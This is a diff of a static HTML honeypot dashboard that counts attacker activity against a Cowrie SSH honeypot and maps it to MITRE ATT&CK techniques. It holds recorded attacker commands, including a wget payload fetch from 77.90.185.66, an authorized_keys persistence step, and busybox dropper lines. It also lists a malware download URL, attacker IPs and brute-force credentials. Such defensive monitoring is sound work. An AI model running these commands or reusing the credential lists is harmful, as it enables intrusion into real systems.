@@ -59,24 +59,24 @@ footer{margin-top:40px;padding-top:18px;border-top:1px solid var(--line);
   <div class="sub">Observed attacker behaviour against an internet-exposed
   Cowrie honeypot, mapped to MITRE ATT&amp;CK.</div>
   <div class="sub" style="margin-top:10px">
-    <span class="badge">Generated 2026-08-11 03:04 UTC</span>
+    <span class="badge">Generated 2026-08-11 04:03 UTC</span>
     <span class="badge">Static snapshot</span>
     <span class="badge">Cowrie 3.x</span>
   </div>
 </header>
 <div class="tiles">
-<div class="tile"><div class="n">627</div><div class="l">Sessions</div></div>
-<div class="tile"><div class="n">576</div><div class="l">Login attempts</div></div>
-<div class="tile"><div class="n">15</div><div class="l">Unique attacker IPs</div></div>
-<div class="tile"><div class="n">131</div><div class="l">Commands run</div></div>
-<div class="tile"><div class="n">9</div><div class="l">Malware downloads</div></div>
+<div class="tile"><div class="n">682</div><div class="l">Sessions</div></div>
+<div class="tile"><div class="n">592</div><div class="l">Login attempts</div></div>
+<div class="tile"><div class="n">20</div><div class="l">Unique attacker IPs</div></div>
+<div class="tile"><div class="n">216</div><div class="l">Commands run</div></div>
+<div class="tile"><div class="n">13</div><div class="l">Malware downloads</div></div>
 <div class="tile"><div class="n">13</div><div class="l">ATT&amp;CK techniques</div></div>
 </div>
 <h2>MITRE ATT&amp;CK Coverage</h2>
 <p class="muted" style="margin-bottom:14px">13 technique(s) across 8 tactic(s). <a href="cowrie-attack-layer.json">Download the ATT&amp;CK Navigator layer</a> and open it at <a href="https://mitre-attack.github.io/attack-navigator/">attack-navigator</a>.</p>
 <div class="tactics">
-<div class="tac"><h3>Initial Access <b>16</b></h3>
-<div class="tech"><span class="tct">16x</span><span class="tid">T1078</span><div class="tnm">Valid Accounts</div>
+<div class="tac"><h3>Initial Access <b>23</b></h3>
+<div class="tech"><span class="tct">23x</span><span class="tid">T1078</span><div class="tnm">Valid Accounts</div>
 <div class="teg">uname -a / exit</div>
 </div>
 </div>
@@ -101,27 +101,27 @@ set -e
 <div class="teg">mkdir -p ~/.ssh; chattr -ia ~/.ssh/authorized_keys; echo &quot;ssh-ed25519 </div>
 </div>
 </div>
-<div class="tac"><h3>Defense Evasion <b>39</b></h3>
-<div class="tech"><span class="tct">38x</span><span class="tid">T1222.002</span><div class="tnm">File and Directory Permissions Modification: Linux and Mac</div>
+<div class="tac"><h3>Defense Evasion <b>71</b></h3>
+<div class="tech"><span class="tct">70x</span><span class="tid">T1222.002</span><div class="tnm">File and Directory Permissions Modification: Linux and Mac</div>
 <div class="teg">/bin/busybox cp /bin/echo dvrHelper; &gt;dvrHelper; /bin/busybox chmod 77</div>
 </div>
 <div class="tech"><span class="tct">1x</span><span class="tid">T1070.004</span><div class="tnm">Indicator Removal: File Deletion</div>
 <div class="teg">export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/b</div>
 </div>
 </div>
-<div class="tac"><h3>Credential Access <b>560</b></h3>
-<div class="tech"><span class="tct">560x</span><span class="tid">T1110.001</span><div class="tnm">Brute Force: Password Guessing</div>
+<div class="tac"><h3>Credential Access <b>569</b></h3>
+<div class="tech"><span class="tct">569x</span><span class="tid">T1110.001</span><div class="tnm">Brute Force: Password Guessing</div>
 <div class="teg">root / 123456</div>
 </div>
 </div>
-<div class="tac"><h3>Discovery <b>13</b></h3>
-<div class="tech"><span class="tct">5x</span><span class="tid">T1082</span><div class="tnm">System Information Discovery</div>
+<div class="tac"><h3>Discovery <b>18</b></h3>
+<div class="tech"><span class="tct">6x</span><span class="tid">T1082</span><div class="tnm">System Information Discovery</div>
 <div class="teg">uname -s -v -n -r -m</div>
 </div>
-<div class="tech"><span class="tct">3x</span><span class="tid">T1033</span><div class="tnm">System Owner/User Discovery</div>
+<div class="tech"><span class="tct">5x</span><span class="tid">T1033</span><div class="tnm">System Owner/User Discovery</div>
 <div class="teg">(wget http://77.90.185.66/wget -O- || busybox wget http://77.90.185.66</div>
 </div>
-<div class="tech"><span class="tct">3x</span><span class="tid">T1057</span><div class="tnm">Process Discovery</div>
+<div class="tech"><span class="tct">5x</span><span class="tid">T1057</span><div class="tnm">Process Discovery</div>
 <div class="teg">/bin/busybox ps; /bin/busybox ECCHI</div>
 </div>
 <div class="tech"><span class="tct">2x</span><span class="tid">T1083</span><div class="tnm">File and Directory Discovery</div>
@@ -132,8 +132,8 @@ set -e
 # 1. </div>
 </div>
 </div>
-<div class="tac"><h3>Command and Control <b>19</b></h3>
-<div class="tech"><span class="tct">19x</span><span class="tid">T1105</span><div class="tnm">Ingress Tool Transfer</div>
+<div class="tac"><h3>Command and Control <b>29</b></h3>
+<div class="tech"><span class="tct">29x</span><span class="tid">T1105</span><div class="tnm">Ingress Tool Transfer</div>
 <div class="teg">(wget http://77.90.185.66/wget -O- || busybox wget http://77.90.185.66</div>
 </div>
 </div>
@@ -148,10 +148,10 @@ set -e
 </div>
 </div>
 <h2>Attack Volume</h2><div class='grid2'>
-<div class="panel"><h3>Top source IPs</h3><svg viewBox="0 0 420 266" class="chart" role="img"><text x="0" y="16" class="bl">91.92.42.52</text><rect x="160" y="6" width="214" height="13" rx="3" fill="#f85149"/><text x="380" y="16" class="bv">500</text><text x="0" y="42" class="bl">80.94.92.234</text><rect x="160" y="32" width="18" height="13" rx="3" fill="#f85149"/><text x="184" y="42" class="bv">43</text><text x="0" y="68" class="bl">77.90.185.66</text><rect x="160" y="58" width="2" height="13" rx="3" fill="#f85149"/><text x="168" y="68" class="bv">6</text><text x="0" y="94" class="bl">140.245.50.204</text><rect x="160" y="84" width="2" height="13" rx="3" fill="#f85149"/><text x="168" y="94" class="bv">5</text><text x="0" y="120" class="bl">108.203.169.20</text><rect x="160" y="110" width="2" height="13" rx="3" fill="#f85149"/><text x="168" y="120" class="bv">4</text><text x="0" y="146" class="bl">129.153.145.135</text><rect x="160" y="136" width="2" height="13" rx="3" fill="#f85149"/><text x="168" y="146" class="bv">4</text><text x="0" y="172" class="bl">5.235.208.190</text><rect x="160" y="162" width="2" height="13" rx="3" fill="#f85149"/><text x="168" y="172" class="bv">2</text><text x="0" y="198" class="bl">67.68.164.63</text><rect x="160" y="188" width="2" height="13" rx="3" fill="#f85149"/><text x="168" y="198" class="bv">2</text><text x="0" y="224" class="bl">170.254.248.205</text><rect x="160" y="214" width="2" height="13" rx="3" fill="#f85149"/><text x="168" y="224" class="bv">2</text><text x="0" y="250" class="bl">177.55.139.141</text><rect x="160" y="240" width="2" height="13" rx="3" fill="#f85149"/><text x="168" y="250" class="bv">2</text></svg></div>
-<div class="panel"><h3>Most-tried usernames</h3><svg viewBox="0 0 420 266" class="chart" role="img"><text x="0" y="16" class="bl">root</text><rect x="160" y="6" width="214" height="13" rx="3" fill="#58a6ff"/><text x="380" y="16" class="bv">143</text><text x="0" y="42" class="bl">admin</text><rect x="160" y="32" width="50" height="13" rx="3" fill="#58a6ff"/><text x="216" y="42" class="bv">34</text><text x="0" y="68" class="bl">ubuntu</text><rect x="160" y="58" width="25" height="13" rx="3" fill="#58a6ff"/><text x="191" y="68" class="bv">17</text><text x="0" y="94" class="bl">user</text><rect x="160" y="84" width="17" height="13" rx="3" fill="#58a6ff"/><text x="183" y="94" class="bv">12</text><text x="0" y="120" class="bl">deploy</text><rect x="160" y="110" width="16" height="13" rx="3" fill="#58a6ff"/><text x="182" y="120" class="bv">11</text><text x="0" y="146" class="bl">test</text><rect x="160" y="136" width="13" height="13" rx="3" fill="#58a6ff"/><text x="179" y="146" class="bv">9</text><text x="0" y="172" class="bl">openclaw</text><rect x="160" y="162" width="8" height="13" rx="3" fill="#58a6ff"/><text x="174" y="172" class="bv">6</text><text x="0" y="198" class="bl">pi</text><rect x="160" y="188" width="7" height="13" rx="3" fill="#58a6ff"/><text x="173" y="198" class="bv">5</text><text x="0" y="224" class="bl">admin1</text><rect x="160" y="214" width="7" height="13" rx="3" fill="#58a6ff"/><text x="173" y="224" class="bv">5</text><text x="0" y="250" class="bl">developer</text><rect x="160" y="240" width="7" height="13" rx="3" fill="#58a6ff"/><text x="173" y="250" class="bv">5</text></svg></div>
-<div class="panel"><h3>Most-tried passwords</h3><svg viewBox="0 0 420 266" class="chart" role="img"><text x="0" y="16" class="bl">123456</text><rect x="160" y="6" width="214" height="13" rx="3" fill="#d29922"/><text x="380" y="16" class="bv">46</text><text x="0" y="42" class="bl">1234</text><rect x="160" y="32" width="116" height="13" rx="3" fill="#d29922"/><text x="282" y="42" class="bv">25</text><text x="0" y="68" class="bl">123</text><rect x="160" y="58" width="107" height="13" rx="3" fill="#d29922"/><text x="273" y="68" class="bv">23</text><text x="0" y="94" class="bl">root</text><rect x="160" y="84" width="102" height="13" rx="3" fill="#d29922"/><text x="268" y="94" class="bv">22</text><text x="0" y="120" class="bl">1</text><rect x="160" y="110" width="65" height="13" rx="3" fill="#d29922"/><text x="231" y="120" class="bv">14</text><text x="0" y="146" class="bl">12345</text><rect x="160" y="136" width="60" height="13" rx="3" fill="#d29922"/><text x="226" y="146" class="bv">13</text><text x="0" y="172" class="bl">12345678</text><rect x="160" y="162" width="55" height="13" rx="3" fill="#d29922"/><text x="221" y="172" class="bv">12</text><text x="0" y="198" class="bl">admin</text><rect x="160" y="188" width="51" height="13" rx="3" fill="#d29922"/><text x="217" y="198" class="bv">11</text><text x="0" y="224" class="bl">password</text><rect x="160" y="214" width="51" height="13" rx="3" fill="#d29922"/><text x="217" y="224" class="bv">11</text><text x="0" y="250" class="bl">111111</text><rect x="160" y="240" width="37" height="13" rx="3" fill="#d29922"/><text x="203" y="250" class="bv">8</text></svg></div>
-<div class="panel"><h3>Most-run commands</h3><svg viewBox="0 0 420 318" class="chart" role="img"><text x="0" y="16" class="bl">/bin/busybox</text><rect x="160" y="6" width="214" height="13" rx="3" fill="#3fb950"/><text x="380" y="16" class="bv">16</text><text x="0" y="42" class="bl">/bin/busybox ECCHI</text><rect x="160" y="32" width="120" height="13" rx="3" fill="#3fb950"/><text x="286" y="42" class="bv">9</text><text x="0" y="68" class="bl">sh</text><rect x="160" y="58" width="93" height="13" rx="3" fill="#3fb950"/><text x="259" y="68" class="bv">7</text><text x="0" y="94" class="bl">enable</text><rect x="160" y="84" width="53" height="13" rx="3" fill="#3fb950"/><text x="219" y="94" class="bv">4</text><text x="0" y="120" class="bl">system</text><rect x="160" y="110" width="53" height="13" rx="3" fill="#3fb950"/><text x="219" y="120" class="bv">4</text><text x="0" y="146" class="bl">shell</text><rect x="160" y="136" width="53" height="13" rx="3" fill="#3fb950"/><text x="219" y="146" class="bv">4</text><text x="0" y="172" class="bl">linuxshell</text><rect x="160" y="162" width="53" height="13" rx="3" fill="#3fb950"/><text x="219" y="172" class="bv">4</text><text x="0" y="198" class="bl">enablelinuxshell</text><rect x="160" y="188" width="53" height="13" rx="3" fill="#3fb950"/><text x="219" y="198" class="bv">4</text><text x="0" y="224" class="bl">ping ;sh</text><rect x="160" y="214" width="53" height="13" rx="3" fill="#3fb950"/><text x="219" y="224" class="bv">4</text><text x="0" y="250" class="bl">busybox</text><rect x="160" y="240" width="53" height="13" rx="3" fill="#3fb950"/><text x="219" y="250" class="bv">4</text><text x="0" y="276" class="bl">cd /proc &amp;&amp; cat self/cmd</text><rect x="160" y="266" width="53" height="13" rx="3" fill="#3fb950"/><text x="219" y="276" class="bv">4</text><text x="0" y="302" class="bl">/bin/busybox ps; /bin/bu</text><rect x="160" y="292" width="40" height="13" rx="3" fill="#3fb950"/><text x="206" y="302" class="bv">3</text></svg></div>
+<div class="panel"><h3>Top source IPs</h3><svg viewBox="0 0 420 266" class="chart" role="img"><text x="0" y="16" class="bl">91.92.42.52</text><rect x="160" y="6" width="214" height="13" rx="3" fill="#f85149"/><text x="380" y="16" class="bv">500</text><text x="0" y="42" class="bl">80.94.92.234</text><rect x="160" y="32" width="18" height="13" rx="3" fill="#f85149"/><text x="184" y="42" class="bv">43</text><text x="0" y="68" class="bl">77.90.185.66</text><rect x="160" y="58" width="4" height="13" rx="3" fill="#f85149"/><text x="170" y="68" class="bv">10</text><text x="0" y="94" class="bl">129.153.145.135</text><rect x="160" y="84" width="2" height="13" rx="3" fill="#f85149"/><text x="168" y="94" class="bv">6</text><text x="0" y="120" class="bl">140.245.50.204</text><rect x="160" y="110" width="2" height="13" rx="3" fill="#f85149"/><text x="168" y="120" class="bv">5</text><text x="0" y="146" class="bl">108.203.169.20</text><rect x="160" y="136" width="2" height="13" rx="3" fill="#f85149"/><text x="168" y="146" class="bv">4</text><text x="0" y="172" class="bl">36.163.100.194</text><rect x="160" y="162" width="2" height="13" rx="3" fill="#f85149"/><text x="168" y="172" class="bv">3</text><text x="0" y="198" class="bl">5.235.208.190</text><rect x="160" y="188" width="2" height="13" rx="3" fill="#f85149"/><text x="168" y="198" class="bv">2</text><text x="0" y="224" class="bl">67.68.164.63</text><rect x="160" y="214" width="2" height="13" rx="3" fill="#f85149"/><text x="168" y="224" class="bv">2</text><text x="0" y="250" class="bl">170.254.248.205</text><rect x="160" y="240" width="2" height="13" rx="3" fill="#f85149"/><text x="168" y="250" class="bv">2</text></svg></div>
+<div class="panel"><h3>Most-tried usernames</h3><svg viewBox="0 0 420 266" class="chart" role="img"><text x="0" y="16" class="bl">root</text><rect x="160" y="6" width="214" height="13" rx="3" fill="#58a6ff"/><text x="380" y="16" class="bv">151</text><text x="0" y="42" class="bl">admin</text><rect x="160" y="32" width="53" height="13" rx="3" fill="#58a6ff"/><text x="219" y="42" class="bv">38</text><text x="0" y="68" class="bl">ubuntu</text><rect x="160" y="58" width="25" height="13" rx="3" fill="#58a6ff"/><text x="191" y="68" class="bv">18</text><text x="0" y="94" class="bl">user</text><rect x="160" y="84" width="17" height="13" rx="3" fill="#58a6ff"/><text x="183" y="94" class="bv">12</text><text x="0" y="120" class="bl">deploy</text><rect x="160" y="110" width="15" height="13" rx="3" fill="#58a6ff"/><text x="181" y="120" class="bv">11</text><text x="0" y="146" class="bl">test</text><rect x="160" y="136" width="12" height="13" rx="3" fill="#58a6ff"/><text x="178" y="146" class="bv">9</text><text x="0" y="172" class="bl">openclaw</text><rect x="160" y="162" width="8" height="13" rx="3" fill="#58a6ff"/><text x="174" y="172" class="bv">6</text><text x="0" y="198" class="bl">pi</text><rect x="160" y="188" width="7" height="13" rx="3" fill="#58a6ff"/><text x="173" y="198" class="bv">5</text><text x="0" y="224" class="bl">admin1</text><rect x="160" y="214" width="7" height="13" rx="3" fill="#58a6ff"/><text x="173" y="224" class="bv">5</text><text x="0" y="250" class="bl">enable</text><rect x="160" y="240" width="7" height="13" rx="3" fill="#58a6ff"/><text x="173" y="250" class="bv">5</text></svg></div>
+<div class="panel"><h3>Most-tried passwords</h3><svg viewBox="0 0 420 266" class="chart" role="img"><text x="0" y="16" class="bl">123456</text><rect x="160" y="6" width="214" height="13" rx="3" fill="#d29922"/><text x="380" y="16" class="bv">47</text><text x="0" y="42" class="bl">root</text><rect x="160" y="32" width="118" height="13" rx="3" fill="#d29922"/><text x="284" y="42" class="bv">26</text><text x="0" y="68" class="bl">1234</text><rect x="160" y="58" width="113" height="13" rx="3" fill="#d29922"/><text x="279" y="68" class="bv">25</text><text x="0" y="94" class="bl">123</text><rect x="160" y="84" width="104" height="13" rx="3" fill="#d29922"/><text x="270" y="94" class="bv">23</text><text x="0" y="120" class="bl">admin</text><rect x="160" y="110" width="63" height="13" rx="3" fill="#d29922"/><text x="229" y="120" class="bv">14</text><text x="0" y="146" class="bl">1</text><rect x="160" y="136" width="63" height="13" rx="3" fill="#d29922"/><text x="229" y="146" class="bv">14</text><text x="0" y="172" class="bl">12345</text><rect x="160" y="162" width="59" height="13" rx="3" fill="#d29922"/><text x="225" y="172" class="bv">13</text><text x="0" y="198" class="bl">12345678</text><rect x="160" y="188" width="54" height="13" rx="3" fill="#d29922"/><text x="220" y="198" class="bv">12</text><text x="0" y="224" class="bl">password</text><rect x="160" y="214" width="50" height="13" rx="3" fill="#d29922"/><text x="216" y="224" class="bv">11</text><text x="0" y="250" class="bl">111111</text><rect x="160" y="240" width="36" height="13" rx="3" fill="#d29922"/><text x="202" y="250" class="bv">8</text></svg></div>
+<div class="panel"><h3>Most-run commands</h3><svg viewBox="0 0 420 318" class="chart" role="img"><text x="0" y="16" class="bl">/bin/busybox</text><rect x="160" y="6" width="214" height="13" rx="3" fill="#3fb950"/><text x="380" y="16" class="bv">30</text><text x="0" y="42" class="bl">/bin/busybox ECCHI</text><rect x="160" y="32" width="107" height="13" rx="3" fill="#3fb950"/><text x="273" y="42" class="bv">15</text><text x="0" y="68" class="bl">sh</text><rect x="160" y="58" width="78" height="13" rx="3" fill="#3fb950"/><text x="244" y="68" class="bv">11</text><text x="0" y="94" class="bl">enable</text><rect x="160" y="84" width="42" height="13" rx="3" fill="#3fb950"/><text x="208" y="94" class="bv">6</text><text x="0" y="120" class="bl">system</text><rect x="160" y="110" width="42" height="13" rx="3" fill="#3fb950"/><text x="208" y="120" class="bv">6</text><text x="0" y="146" class="bl">shell</text><rect x="160" y="136" width="42" height="13" rx="3" fill="#3fb950"/><text x="208" y="146" class="bv">6</text><text x="0" y="172" class="bl">linuxshell</text><rect x="160" y="162" width="42" height="13" rx="3" fill="#3fb950"/><text x="208" y="172" class="bv">6</text><text x="0" y="198" class="bl">enablelinuxshell</text><rect x="160" y="188" width="42" height="13" rx="3" fill="#3fb950"/><text x="208" y="198" class="bv">6</text><text x="0" y="224" class="bl">ping ;sh</text><rect x="160" y="214" width="42" height="13" rx="3" fill="#3fb950"/><text x="208" y="224" class="bv">6</text><text x="0" y="250" class="bl">busybox</text><rect x="160" y="240" width="42" height="13" rx="3" fill="#3fb950"/><text x="208" y="250" class="bv">6</text><text x="0" y="276" class="bl">cd /proc &amp;&amp; cat self/cmd</text><rect x="160" y="266" width="42" height="13" rx="3" fill="#3fb950"/><text x="208" y="276" class="bv">6</text><text x="0" y="302" class="bl">/bin/busybox ps; /bin/bu</text><rect x="160" y="292" width="35" height="13" rx="3" fill="#3fb950"/><text x="201" y="302" class="bv">5</text></svg></div>
 </div>
 <h2>Malware Retrieved</h2><div class='panel scroll'><table><tr><th>URL</th><th>SHA-256</th></tr>
 <tr><td></td><td>4af5a5c98ad132095c6fbe7b02c242153a190a01cc321e50a916a0ca46fbaa62</td></tr>
@@ -160,17 +160,17 @@ set -e
 <tr><td>https://del.sou.pp.ua/install_tm.sh</td><td>8db103466c032c12d0b945bc1f86e62039f9b2f44779c7450eac9e52251fcd62</td></tr>
 </table></div>
 <h2>Commands Executed by Attackers</h2><div class='panel scroll'><table><tr><th>Count</th><th>Command</th><th>Mapped technique(s)</th></tr>
-<tr><td>16</td><td>/bin/busybox</td><td>&mdash;</td></tr>
-<tr><td>9</td><td>/bin/busybox ECCHI</td><td>&mdash;</td></tr>
-<tr><td>7</td><td>sh</td><td>&mdash;</td></tr>
-<tr><td>4</td><td>enable</td><td>&mdash;</td></tr>
-<tr><td>4</td><td>system</td><td>&mdash;</td></tr>
-<tr><td>4</td><td>shell</td><td>&mdash;</td></tr>
-<tr><td>4</td><td>linuxshell</td><td>&mdash;</td></tr>
-<tr><td>4</td><td>enablelinuxshell</td><td>&mdash;</td></tr>
-<tr><td>4</td><td>ping ;sh</td><td>&mdash;</td></tr>
-<tr><td>4</td><td>busybox</td><td>&mdash;</td></tr>
-<tr><td>4</td><td>cd /proc &amp;&amp; cat self/cmdline</td><td>&mdash;</td></tr>
-<tr><td>3</td><td>/bin/busybox ps; /bin/busybox ECCHI</td><td>T1057</td></tr>
+<tr><td>30</td><td>/bin/busybox</td><td>&mdash;</td></tr>
+<tr><td>15</td><td>/bin/busybox ECCHI</td><td>&mdash;</td></tr>
+<tr><td>11</td><td>sh</td><td>&mdash;</td></tr>
+<tr><td>6</td><td>enable</td><td>&mdash;</td></tr>
+<tr><td>6</td><td>system</td><td>&mdash;</td></tr>
+<tr><td>6</td><td>shell</td><td>&mdash;</td></tr>
+<tr><td>6</td><td>linuxshell</td><td>&mdash;</td></tr>
+<tr><td>6</td><td>enablelinuxshell</td><td>&mdash;</td></tr>
+<tr><td>6</td><td>ping ;sh</td><td>&mdash;</td></tr>
+<tr><td>6</td><td>busybox</td><td>&mdash;</td></tr>
+<tr><td>6</td><td>cd /proc &amp;&amp; cat self/cmdline</td><td>&mdash;</td></tr>
+<tr><td>5</td><td>/bin/busybox ps; /bin/busybox ECCHI</td><td>T1057</td></tr>
 </table></div>
 <footer>Static snapshot generated from Cowrie's JSON event log. Cowrie emulates a Linux shell &mdash; attacker commands are recorded, never executed. Source and deployment automation: <a href="https://github.com/ajcyberdefense/cowrie-honeypot">github.com/ajcyberdefense/cowrie-honeypot</a>. </footer></div>
